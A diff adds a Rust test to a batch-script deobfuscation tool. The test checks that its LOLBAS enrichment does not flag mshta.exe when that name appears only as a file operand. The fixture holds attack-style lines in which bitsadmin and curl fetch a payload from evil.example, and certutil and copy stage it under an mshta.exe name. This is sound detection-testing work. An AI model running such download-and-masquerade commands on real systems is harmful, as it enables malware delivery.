@@ -494,6 +494,60 @@ fn summarize_lolbas_enrichment_matches_program_path_after_command_separator() {
 }
 
 #[test]
+fn summarize_lolbas_enrichment_ignores_program_names_in_non_exec_operands() {
+    let dir = TempDir::new().expect("tmp");
+    let input = dir.path().join("in.bat");
+    fs::write(
+        &input,
+        concat!(
+            "bitsadmin /transfer j http://evil.example/payload.bin C:\\Users\\Public\\mshta.exe\r\n",
+            "certutil -decode C:\\Users\\Public\\mshta.exe C:\\Users\\Public\\payload.bin\r\n",
+            "msiexec /i C:\\Users\\Public\\setup.msi /L*v C:\\Users\\Public\\mshta.exe\r\n",
+            "copy C:\\Users\\Public\\payload.bin C:\\Users\\Public\\mshta.exe\r\n",
+            "curl http://evil.example/payload.bin, C:\\Users\\Public\\mshta.exe\r\n",
+        ),
+    )
+    .expect("write input");
+    let lolbas = dir.path().join("lolbas.json");
+    fs::write(
+        &lolbas,
+        r#"[
+          {
+            "Name": "Mshta.exe",
+            "url": "https://lolbas-project.github.io/lolbas/Binaries/Mshta/",
+            "Commands": [
+              {
+                "Category": "Execute",
+                "MitreID": "T1218.005"
+              }
+            ]
+          }
+        ]"#,
+    )
+    .expect("write lolbas");
+
+    let out = Command::cargo_bin("batdeob")
+        .expect("bin")
+        .args([
+            "summarize",
+            input.to_str().expect("input path"),
+            "--lolbas-json",
+            lolbas.to_str().expect("lolbas path"),
+        ])
+        .assert()
+        .success()
+        .get_output()
+        .stdout
+        .clone();
+    let v: serde_json::Value = serde_json::from_slice(&out).expect("json");
+    let matches = v
+        .get("lolbas_matches")
+        .and_then(|v| v.as_array())
+        .expect("lolbas_matches array");
+    assert_eq!(matches.len(), 0, "unexpected matches: {matches:?}");
+}
+
+#[test]
 fn analyze_can_enrich_lolbas_matches_from_external_json() {
     let dir = TempDir::new().expect("tmp");
     let input = dir.path().join("in.bat");
